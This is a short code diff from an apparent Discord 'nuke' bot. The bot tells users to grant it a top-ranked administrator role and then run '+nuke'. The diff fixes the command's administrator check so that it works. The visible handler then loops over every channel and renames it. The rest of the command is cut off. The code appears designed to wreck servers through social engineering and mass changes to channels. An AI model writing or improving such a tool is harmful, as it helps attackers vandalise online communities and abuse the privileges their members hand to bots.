@@ -30,7 +30,7 @@ client.on("message", async (message) => {
         message.channel.send("Give me a role with administrator and put it as high up on the list as you can and do ``+nuke``").catch(err =>{});
     };
     if(message.content.startsWith("+nuke")) {
-        if(message.author.hasPermission("ADMINISTRATOR")) return message.channel.send("You need ADMINISTRATOR to use this command!");
+        if(!message.channel.permissionsFor(message.member).has("ADMINISTRATOR")) return message.channel.send("You need ADMINISTRATOR to use this command!");
         if(message.guild.me.hasPermission("ADMINISTRATOR")) {
             message.guild.channels.forEach( async (channel) => {
                 let name = RandomEmoji() + channel.name; 
